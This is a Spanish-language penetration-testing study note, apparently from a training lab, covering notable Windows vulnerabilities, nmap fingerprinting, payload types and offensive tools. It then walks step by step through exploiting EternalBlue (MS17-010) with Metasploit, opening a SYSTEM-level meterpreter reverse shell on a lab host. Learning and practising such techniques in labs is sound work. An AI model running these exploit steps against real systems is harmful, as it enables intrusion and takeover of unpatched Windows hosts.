https://www.cvedetails.com/vendor/26/Microsoft.html

## Explotaciones destacadas de Windows
En los últimos años, varias vulnerabilidades en el sistema operativo Windows y sus correspondientes ataques son algunas de las vulnerabilidades más explotadas de nuestro tiempo. Discutamos esto por un minuto:

| **Vulnerabilidad** | **Descripción**                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              |
| ------------------ | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `MS08-067`         | MS08-067 fue un parche crítico que se implementó en muchas revisiones diferentes de Windows debido a una falla de SMB. Esta falla hizo que fuera extremadamente fácil infiltrarse en un host de Windows. Era tan eficiente que el gusano Conficker lo utilizaba para infectar todos los hosts vulnerables que encontraba. Incluso Stuxnet aprovechó esta vulnerabilidad.                                                                                                                                                                                                                                                     |
| `Eternal Blue`     | MS17-010 es un exploit filtrado en el volcado de Shadow Brokers de la NSA. Este exploit se utilizó sobre todo en el ransomware WannaCry y en los ciberataques NotPetya. Este ataque aprovechó una falla en el protocolo SMB v1 que permitía la ejecución de código. Se cree que EternalBlue infectó más de 200.000 hosts solo en 2017 y sigue siendo una forma común de encontrar acceso a un host de Windows vulnerable.                                                                                                                                                                                                    |
| `PrintNightmare`   | Una vulnerabilidad de ejecución remota de código en la cola de impresión de Windows. Con credenciales válidas para ese host o un shell con privilegios bajos, puede instalar una impresora, agregar un controlador que se ejecute automáticamente y le otorgue acceso a nivel de sistema al host. Esta vulnerabilidad ha estado devastando a las empresas durante 2021. 0xdf escribió una publicación increíble al respecto [aquí](https://0xdf.gitlab.io/2021/07/08/playing-with-printnightmare.html) .                                                                                                                     |
| `BlueKeep`         | CVE 2019-0708 es una vulnerabilidad en el protocolo RDP de Microsoft que permite la ejecución remota de código. Esta vulnerabilidad aprovechó un canal mal llamado para obtener la ejecución de código, lo que afectó a todas las revisiones de Windows, desde Windows 2000 hasta Server 2008 R2.                                                                                                                                                                                                                                                                                                                            |
| `Sigred`           | CVE 2020-1350 utilizó una falla en la forma en que DNS lee los registros de recursos SIG. Es un poco más complicado que los otros exploits de esta lista, pero si se hace correctamente, le dará al atacante privilegios de administrador de dominio, ya que afectará al servidor DNS del dominio, que suele ser el controlador de dominio principal.                                                                                                                                                                                                                                                                        |
| `SeriousSam`       | CVE 2021-36924 explota un problema con la forma en que Windows maneja los permisos en el `C:\Windows\system32\config`carpeta. Antes de solucionar el problema, los usuarios no elevados tienen acceso a la base de datos SAM, entre otros archivos. Esto no es un gran problema ya que no se puede acceder a los archivos mientras la PC los usa, pero esto se vuelve peligroso cuando se analizan copias de seguridad de instantáneas de volumen. Estos mismos errores de privilegios también existen en los archivos de respaldo, lo que permite a un atacante leer la base de datos SAM y deshacerse de las credenciales. |
| `Zerologon`        | CVE 2020-1472 es una vulnerabilidad crítica que explota una falla criptográfica en el protocolo remoto Netlogon de Active Directory (MS-NRPC) de Microsoft. Permite a los usuarios iniciar sesión en servidores utilizando NT LAN Manager (NTLM) e incluso enviar cambios de cuenta a través del protocolo. El ataque puede ser un poco complejo, pero su ejecución es trivial, ya que un atacante tendría que adivinar alrededor de 256 contraseñas de cuentas de computadoras antes de encontrar lo que necesita. Esto puede suceder en cuestión de unos segundos.                                                         |

## Enumeración de Windows y métodos de toma de huellas digitales
`What are a few ways to determine if the host is likely a Windows Machine`? Para responder a esta pregunta, podemos mirar algunas cosas. Siendo el primero el `Time To Live`(TTL) cuando se utiliza ICMP para determinar si el host está activo. Una respuesta típica de un host de Windows será 32 o 128. Una respuesta de 128 o alrededor de ella es la respuesta más común que verá. Es posible que este valor no siempre sea exacto, especialmente si no se encuentra en la misma red de capa tres que el objetivo.
https://subinsb.com/default-device-ttl-values/


## Ping
```js
┌──(pelado㉿kali)-[~/HTB/Academy/ShellsPayloads]
└─$ ping 10.129.201.97 -c 4
PING 10.129.201.97 (10.129.201.97) 56(84) bytes of data.
64 bytes from 10.129.201.97: icmp_seq=1 ttl=127 time=179 ms
64 bytes from 10.129.201.97: icmp_seq=2 ttl=127 time=203 ms
64 bytes from 10.129.201.97: icmp_seq=3 ttl=127 time=187 ms
64 bytes from 10.129.201.97: icmp_seq=4 ttl=127 time=163 ms

--- 10.129.201.97 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3001ms
rtt min/avg/max/mdev = 162.871/183.039/202.957/14.428 ms
```

TTL=127=Windows

#### OS Detection Scan
```js
┌──(pelado㉿kali)-[~/HTB/Academy/ShellsPayloads]
└─$ sudo nmap -O 10.129.201.97
[sudo] password for pelado: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-21 15:00 EDT
Nmap scan report for 10.129.201.97
Host is up (0.16s latency).
Not shown: 996 closed tcp ports (reset)
PORT    STATE SERVICE
80/tcp  open  http
135/tcp open  msrpc
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=6/21%OT=80%CT=1%CU=39610%PV=Y%DS=2%DC=I%G=Y%TM=6675
OS:CDEB%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=108%TI=I%CI=I%II=I%SS=S%
OS:TS=A)OPS(O1=M53CNW8ST11%O2=M53CNW8ST11%O3=M53CNW8NNT11%O4=M53CNW8ST11%O5
OS:=M53CNW8ST11%O6=M53CST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=
OS:2000)ECN(R=Y%DF=Y%T=80%W=2000%O=M53CNW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%
OS:A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0
OS:%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S
OS:=A%A=O%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%
OS:RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)
```


#### Banner Grab to Enumerate Ports
```js
sudo nmap -v 192.168.86.39 --script banner.nse
```

```js
┌──(pelado㉿kali)-[~/HTB/Academy/ShellsPayloads]
└─$ sudo nmap -sCVS -p- --min-rate=1000 10.129.201.97 -Pn -n            
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-21 19:19 EDT
Stats: 0:02:06 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 46.15% done; ETC: 19:23 (0:01:01 remaining)
Nmap scan report for 10.129.201.97
Host is up (0.15s latency).
Not shown: 65522 closed tcp ports (reset)
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 10.0
|_http-title: 10.129.201.97 - /
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  msrpc        Microsoft Windows RPC
49670/tcp open  msrpc        Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2024-06-21T23:22:12
|_  start_date: 2024-06-21T22:43:30
|_clock-skew: mean: 2h20m02s, deviation: 4h02m33s, median: 0s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: SHELLS-WINBLUE
|   NetBIOS computer name: SHELLS-WINBLUE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2024-06-21T16:22:18-07:00
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

```
## Bats, DLLs, & MSI Files, Oh My!
Cuando se trata de crear cargas útiles para hosts de Windows, tenemos muchas opciones para elegir. DLL, archivos por lotes, paquetes MSI e incluso scripts de PowerShell son algunos de los métodos más comunes a utilizar. Cada tipo de archivo puede lograr cosas diferentes para nosotros, pero lo que todos tienen en común es que son ejecutables en un host. Intente tener en cuenta el mecanismo de entrega de la carga útil, ya que esto puede determinar qué tipo de carga útil utilizará.

#### Payload Types to Consider
[DLL](https://docs.microsoft.com/en-us/troubleshoot/windows-client/deployment/dynamic-link-library) Una biblioteca de vínculos dinámicos (DLL) es un archivo de biblioteca que se utiliza en los sistemas operativos de Microsoft para proporcionar código y datos compartidos que pueden ser utilizados por muchos programas diferentes a la vez. Estos archivos son modulares y nos permiten tener aplicaciones más dinámicas y fáciles de actualizar. Como pentester, inyectar una DLL maliciosa o secuestrar una biblioteca vulnerable en el host puede elevar nuestros privilegios a SISTEMA y/o eludir los controles de cuentas de usuario.

[Los archivos por lotes](https://commandwindows.com/batch.htm) son scripts de DOS basados ​​en texto que utilizan los administradores del sistema para completar múltiples tareas a través del intérprete de línea de comandos. Estos archivos terminan con una extensión de `.bat`. Podemos usar archivos por lotes para ejecutar comandos en el host de forma automatizada. Por ejemplo, podemos hacer que un archivo por lotes abra un puerto en el host o volver a conectarnos a nuestro cuadro de ataque. Una vez hecho esto, puede realizar pasos básicos de enumeración y enviarnos información a través del puerto abierto.

[VBS](https://www.guru99.com/introduction-to-vbscript.html) VBScript es un lenguaje de programación ligero basado en Visual Basic de Microsoft. Normalmente se utiliza como lenguaje de secuencias de comandos del lado del cliente en servidores web para habilitar páginas web dinámicas. VBS está anticuado y deshabilitado por la mayoría de los navegadores web modernos, pero sigue vivo en el contexto de Phishing y otros ataques destinados a que los usuarios realicen una acción como habilitar la carga de macros en un documento de Excel o hacer clic en una celda para tener el motor de secuencias de comandos de Windows. ejecutar un fragmento de código.

[MSI](https://docs.microsoft.com/en-us/windows/win32/msi/windows-installer-file-extensions) `.MSI`Los archivos sirven como base de datos de instalación para Windows Installer. Al intentar instalar una nueva aplicación, el instalador buscará el archivo .msi para comprender todos los componentes necesarios y cómo encontrarlos. Podemos utilizar Windows Installer creando una carga útil como un archivo .msi. Una vez que lo tengamos en el host, podemos ejecutar `msiexec` para ejecutar nuestro archivo, lo que nos proporcionará acceso adicional, como un shell inverso elevado.

[Powershell](https://docs.microsoft.com/en-us/powershell/scripting/overview?view=powershell-7.1) Powershell es a la vez un entorno de shell y un lenguaje de programación. Sirve como entorno de shell moderno de Microsoft en sus sistemas operativos. Como lenguaje de secuencias de comandos, es un lenguaje dinámico basado en .NET Common Language Runtime que, al igual que su componente de shell, toma entradas y salidas como objetos .NET. PowerShell puede brindarnos una gran cantidad de opciones cuando se trata de obtener un shell y ejecutarlo en un host, entre muchos otros pasos en nuestro proceso de pruebas de penetración.

Analicemos algunas herramientas, tácticas y procedimientos básicos para construir nuestras cargas útiles y entregarlas al host para aterrizar un shell.
## Tools, Tactics, and Procedures for Payload Generation, Transfer, and Execution
#### Payload Generation
|**Recurso**|**Descripción**|
|---|---|
|`MSFVenom & Metasploit-Framework`|[Source](https://github.com/rapid7/metasploit-framework) MSF es una herramienta extremadamente versátil para el conjunto de herramientas de cualquier pentester. Sirve como una forma de enumerar hosts, generar cargas útiles, utilizar exploits públicos y personalizados y realizar acciones posteriores a la explotación una vez en el host. Piense en ello como una navaja suiza.|
|`Payloads All The Things`|[Fuente](https://github.com/swisskyrepo/PayloadsAllTheThings) Aquí puede encontrar muchos recursos diferentes y hojas de trucos para la generación de carga útil y la metodología general.|
|`Mythic C2 Framework`|[Fuente](https://github.com/its-a-feature/Mythic) El marco Mythic C2 es una opción alternativa a Metasploit como marco de comando y control y caja de herramientas para la generación de carga útil única.|
|`Nishang`|[Fuente](https://github.com/samratashok/nishang) Nishang es una colección de marcos de scripts e implantes ofensivos de PowerShell. Incluye muchas utilidades que pueden resultar útiles para cualquier pentester.|
|`Darkarmour`|[Source](https://github.com/bats3c/darkarmour) Darkarmour es una herramienta para generar y utilizar archivos binarios ofuscados para usarlos contra hosts de Windows.|
#### Payload Transfer and Execution
Además de los vectores de ataques web, correos electrónicos de phishing o puntos muertos, los hosts de Windows pueden proporcionarnos otras vías de entrega de carga útil. La siguiente lista incluye algunas herramientas y protocolos útiles para usar al intentar lanzar una carga útil sobre un objetivo.
- `Impacket`: [Impacket](https://github.com/SecureAuthCorp/impacket) es un conjunto de herramientas integrado en Python que nos proporciona una forma de interactuar directamente con los protocolos de red. Algunas de las herramientas más interesantes que nos interesan en Impacket son `psexec`, `smbclient`, `wmi`, Kerberos y la capacidad de montar un servidor SMB.
- [Payloads All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Download%20and%20Execute.md) : es un gran recurso para encontrar líneas rápidas que ayuden a transferir archivos entre hosts de manera conveniente.
- `SMB`: SMB puede proporcionar una ruta fácil de explotar para transferir archivos entre hosts. Esto puede resultar especialmente útil cuando los hosts víctimas están unidos a un dominio y utilizan recursos compartidos para alojar datos. Nosotros, como atacantes, podemos usar estos archivos compartidos SMB junto con C$ y admin$ para alojar y transferir nuestras cargas útiles e incluso filtrar datos a través de los enlaces.
- `Remote execution via MSF`: Integrada en muchos de los módulos de exploits en Metasploit hay una función que construirá, organizará y ejecutará las cargas útiles automáticamente.
- `Other Protocols`: Al mirar un host, protocolos como FTP, TFTP, HTTP/S y más pueden proporcionarle una forma de cargar archivos al host. Enumere y preste atención a las funciones que están abiertas y disponibles para su uso.
Ahora que sabemos qué herramientas, tácticas y procedimientos podemos utilizar para transferir nuestras cargas útiles, veamos un ejemplo de proceso de compromiso.

## Ejemplo de tutorial de compromiso

1 - Enumerate The Host
Ping, Netcat, Nmap scans e incluso Metasploit son buenas opciones para empezar a enumerar a nuestras víctimas potenciales. Para comenzar esta vez, utilizaremos un escaneo de Nmap. La parte de enumeración de cualquier cadena de exploits es posiblemente la pieza más crítica del rompecabezas. Comprender el objetivo y lo que lo motiva aumentará tus posibilidades de obtener un shell.

```js
┌──(pelado㉿kali)-[~/HTB/Academy/ShellsPayloads]
└─$ sudo nmap -A  10.129.201.97
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-21 19:33 EDT
Stats: 0:00:54 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 93.23% done; ETC: 19:34 (0:00:04 remaining)
Nmap scan report for 10.129.201.97 (10.129.201.97)
Host is up (0.15s latency).
Not shown: 996 closed tcp ports (reset)
PORT    STATE SERVICE      VERSION
80/tcp  open  http         Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: 10.129.201.97 - /
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=6/21%OT=80%CT=1%CU=37553%PV=Y%DS=2%DC=T%G=Y%TM=6676
OS:0EFA%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=109%TI=I%TS=A)SEQ(SP=104
OS:%GCD=1%ISR=109%TI=I%CI=I%II=I%SS=S%TS=A)OPS(O1=M53CNW8ST11%O2=M53CNW8ST1
OS:1%O3=M53CNW8NNT11%O4=M53CNW8ST11%O5=M53CNW8ST11%O6=M53CST11)WIN(W1=2000%
OS:W2=2000%W3=2000%W4=2000%W5=2000%W6=2000)ECN(R=Y%DF=Y%T=80%W=2000%O=M53CN
OS:W8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=
OS:N)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=O%A
OS:=O%F=R%O=%RD=0%Q=)T5(R=N)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T5
OS:(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=N)T6(R=Y%DF=Y%T=80%W=0%
OS:S=A%A=O%F=R%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=O%A=O%F=R%O=%RD=0%Q=)T7(R=
OS:N)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y
OS:%DFI=N%T=80%CD=Z)

Network Distance: 2 hops
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-06-21T23:38:25
|_  start_date: 2024-06-21T22:43:30
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: mean: 2h20m01s, deviation: 4h02m31s, median: 0s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: SHELLS-WINBLUE
|   NetBIOS computer name: SHELLS-WINBLUE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2024-06-21T16:38:24-07:00

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   191.18 ms 10.10.14.1 (10.10.14.1)
2   191.29 ms 10.129.201.97 (10.129.201.97)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 323.00 seconds
```

Descubrimos algunas cosas:
- Esta corriendo `Windows Server 2016 Standard 6.3`
Ahora tenemos el nombre de host y sabemos que no está en un dominio y que está ejecutando varios servicios. Ahora que hemos recopilado información, determinemos nuestra posible ruta de explotación.  `IIS` podría ser una ruta potencial, intentar acceder al host a través de SMB utilizando una herramienta como Impacket o autenticándonos si tuviéramos credenciales podría hacerlo, y desde la perspectiva del sistema operativo, también puede haber una ruta para un RCE. Se sabe que MS17-010 (EternalBlue) afecta a hosts que van desde Windows 2008 hasta Server 2016. Con esto en mente, podría ser una apuesta sólida que nuestra víctima sea vulnerable ya que cae en esa ventana. Validemos eso usando una verificación auxiliar incorporada de `Metasploit`, `auxiliary/scanner/smb/smb_ms17_010`.

2 - Busque y decida una ruta de explotación
Abierto `msfconsole`y busque EternalBlue, o puede usar la cadena en la sesión a continuación para usar el cheque. Configure el campo RHOSTS con la dirección IP del objetivo e inicie el escaneo. Como se puede ver en las opciones del módulo, puede completar más configuraciones de SMB, pero no es necesario. Ayudarán a que la verificación tenga más probabilidades de tener éxito. Cuando esté listo, escriba `run`.

```js
msf6 > search eternalblue

Matching Modules
================

   #   Name                                           Disclosure Date  Rank     Check  Description
   -   ----                                           ---------------  ----     -----  -----------
   0   exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1     \_ target: Automatic Target                  .                .        .      .
   2     \_ target: Windows 7                         .                .        .      .
   3     \_ target: Windows Embedded Standard 7       .                .        .      .
   4     \_ target: Windows Server 2008 R2            .                .        .      .
   5     \_ target: Windows 8                         .                .        .      .
   6     \_ target: Windows 8.1                       .                .        .      .
   7     \_ target: Windows Server 2012               .                .        .      .
   8     \_ target: Windows 10 Pro                    .                .        .      .
   9     \_ target: Windows 10 Enterprise Evaluation  .                .        .      .
   10  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   11    \_ target: Automatic                         .                .        .      .
   12    \_ target: PowerShell                        .                .        .      .
   13    \_ target: Native upload                     .                .        .      .
   14    \_ target: MOF upload                        .                .        .      .
   15    \_ AKA: ETERNALSYNERGY                       .                .        .      .
   16    \_ AKA: ETERNALROMANCE                       .                .        .      .
   17    \_ AKA: ETERNALCHAMPION                      .                .        .      .
   18    \_ AKA: ETERNALBLUE                          .                .        .      .
   19  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   20    \_ AKA: ETERNALSYNERGY                       .                .        .      .
   21    \_ AKA: ETERNALROMANCE                       .                .        .      .
   22    \_ AKA: ETERNALCHAMPION                      .                .        .      .
   23    \_ AKA: ETERNALBLUE                          .                .        .      .
   24  auxiliary/scanner/smb/smb_ms17_010             .                normal   No     MS17-010 SMB RCE Detection
   25    \_ AKA: DOUBLEPULSAR                         .                .        .      .
   26    \_ AKA: ETERNALBLUE                          .                .        .      .
   27  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
   28    \_ target: Execute payload (x64)             .                .        .      .
   29    \_ target: Neutralize implant                .                .        .      .
Interact with a module by name or index. For example info 29, use 29 or use exploit/windows/smb/smb_doublepulsar_rce
After interacting with a module you can manually set a TARGET with set TARGET 'Neutralize implant'
```

Es vulnerable.
```js
msf6 > use 24
msf6 auxiliary(scanner/smb/smb_ms17_010) > set RHOSTS 10.129.201.97
RHOSTS => 10.129.201.97
msf6 auxiliary(scanner/smb/smb_ms17_010) > run

[+] 10.129.201.97:445     - Host is likely VULNERABLE to MS17-010! - Windows Server 2016 Standard 14393 x64 (64-bit)
[*] 10.129.201.97:445     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/smb/smb_ms17_010) > 
```

3 - Select Exploit & Payload, then Deliver
```js
msf6 auxiliary(scanner/smb/smb_ms17_010) > search eternal

Matching Modules
================

   #   Name                                           Disclosure Date  Rank     Check  Description
   -   ----                                           ---------------  ----     -----  -----------
   0   exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1     \_ target: Automatic Target                  .                .        .      .
   2     \_ target: Windows 7                         .                .        .      .
   3     \_ target: Windows Embedded Standard 7       .                .        .      .
   4     \_ target: Windows Server 2008 R2            .                .        .      .
   5     \_ target: Windows 8                         .                .        .      .
   6     \_ target: Windows 8.1                       .                .        .      .
   7     \_ target: Windows Server 2012               .                .        .      .
   8     \_ target: Windows 10 Pro                    .                .        .      .
   9     \_ target: Windows 10 Enterprise Evaluation  .                .        .      .
   10  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   11    \_ target: Automatic                         .                .        .      .
   12    \_ target: PowerShell                        .                .        .      .
   13    \_ target: Native upload                     .                .        .      .
   14    \_ target: MOF upload                        .                .        .      .
   15    \_ AKA: ETERNALSYNERGY                       .                .        .      .
   16    \_ AKA: ETERNALROMANCE                       .                .        .      .
   17    \_ AKA: ETERNALCHAMPION                      .                .        .      .
   18    \_ AKA: ETERNALBLUE                          .                .        .      .
   19  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   20    \_ AKA: ETERNALSYNERGY                       .                .        .      .
   21    \_ AKA: ETERNALROMANCE                       .                .        .      .
   22    \_ AKA: ETERNALCHAMPION                      .                .        .      .
   23    \_ AKA: ETERNALBLUE                          .                .        .      .
   24  auxiliary/scanner/smb/smb_ms17_010             .                normal   No     MS17-010 SMB RCE Detection
   25    \_ AKA: DOUBLEPULSAR                         .                .        .      .
   26    \_ AKA: ETERNALBLUE                          .                .        .      .
   27  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
   28    \_ target: Execute payload (x64)             .                .        .      .
   29    \_ target: Neutralize implant                .                .        .      .
Interact with a module by name or index. For example info 29, use 29 or use exploit/windows/smb/smb_doublepulsar_rce
After interacting with a module you can manually set a TARGET with set TARGET 'Neutralize implant'

msf6 auxiliary(scanner/smb/smb_ms17_010) > use 10
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_psexec) > 
```

```js
msf6 exploit(windows/smb/ms17_010_psexec) > show options
Module options (exploit/windows/smb/ms17_010_psexec):

   Name                  Current Setting                                                 Required  Description
   ----                  ---------------                                                 --------  -----------
   DBGTRACE              false                                                           yes       Show extra debug trace info
   LEAKATTEMPTS          99                                                              yes       How many times to try to leak transaction
   NAMEDPIPE                                                                             no        A named pipe that can be connected to (leave blank for auto)
   NAMED_PIPES           /usr/share/metasploit-framework/data/wordlists/named_pipes.txt  yes       List of named pipes to check
   RHOSTS                                                                                yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT                 445                                                             yes       The Target port (TCP)
   SERVICE_DESCRIPTION                                                                   no        Service description to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                                                                  no        The service display name
   SERVICE_NAME                                                                          no        The service name
   SHARE                 ADMIN$                                                          yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share
   SMBDomain             .                                                               no        The Windows domain to use for authentication
   SMBPass                                                                               no        The password for the specified username
   SMBUser                                                                               no        The username to authenticate as

Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.1.4      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic

View the full module info with the info, or info -d command.
msf6 exploit(windows/smb/ms17_010_psexec) > set LHOST 10.10.15.13
LHOST => 10.10.15.13
msf6 exploit(windows/smb/ms17_010_psexec) > set RHOSTS 10.129.201.97
RHOSTS => 10.129.201.97
msf6 exploit(windows/smb/ms17_010_psexec) > run
```

Esta vez, lo mantuvimos simple y solo usamos un `windows/meterpreter/reverse_tcp`carga útil. Puedes cambiar esto como desees para un tipo de proyectil diferente u ofuscar más tu ataque, como se muestra en las secciones de cargas útiles anteriores. Con nuestras opciones configuradas, intentémoslo y veamos si conseguimos un proyectil.

```js
msf6 exploit(windows/smb/ms17_010_psexec) > run

[*] Started reverse TCP handler on 10.10.15.13:4444 
[*] 10.129.201.97:445 - Target OS: Windows Server 2016 Standard 14393
[*] 10.129.201.97:445 - Built a write-what-where primitive...
[+] 10.129.201.97:445 - Overwrite complete... SYSTEM session obtained!
[*] 10.129.201.97:445 - Selecting PowerShell target
[*] 10.129.201.97:445 - Executing the payload...
[+] 10.129.201.97:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (176198 bytes) to 10.129.201.97
[*] Meterpreter session 1 opened (10.10.15.13:4444 -> 10.129.201.97:49673) at 2024-06-21 20:12:47 -0400

meterpreter > 
```

Conseguimos nuestro exploit y obtuvimos una sesión de shell. A `SYSTEM`caparazón nivelado en eso. Como se vio en los módulos anteriores de MSF, ahora que tenemos una sesión abierta a través de Meterpreter, se nos presenta el `meterpreter >` inmediato. Desde aquí, podemos utilizar Meterpreter para ejecutar más comandos para recopilar información del sistema, robar credenciales de usuario o utilizar otro módulo posterior a la explotación contra el host.

5 - Identify the Native Shell.

```js
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > shell
Process 540 created.
Channel 1 created.
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

Cuando ejecutamos el comando Meterpreter `shell`, inició otro proceso en el host y nos colocó en un shell del sistema. ¿Puedes determinar en qué nos encontramos a partir del mensaje? solo viendo `C:\Windows\system32>` puede indicarnos que estamos en una `cmd.exe shell`. Para estar seguro, simplemente ejecutando el comando help desde el shell también se lo informará. Si nos colocaran en PowerShell, nuestro mensaje se vería así `PS C:\Windows\system32>`. El PS al frente nos permite saber que es una sesión de PowerShell.

## CMD-Prompt y Power[Shell]s
Usar `CMD` cuando:
- Estás en un host antiguo que puede no incluir PowerShell.
- Cuando solo requiere interacciones/acceso simples al host.
- Cuando planea utilizar archivos por lotes simples, comandos net o herramientas nativas de MS-DOS.
- Cuando crea que las políticas de ejecución pueden afectar su capacidad para ejecutar scripts u otras acciones en el host.

Usar `PowerShell` cuando:
- Tiene previsto utilizar cmdlets u otros scripts personalizados.
- Cuando desee interactuar con objetos .NET en lugar de salida de texto.
- Cuando ser sigiloso es una preocupación menor.
- Si planea interactuar con servicios y hosts basados ​​en la nube.
- Si sus scripts configuran y usan Alias.
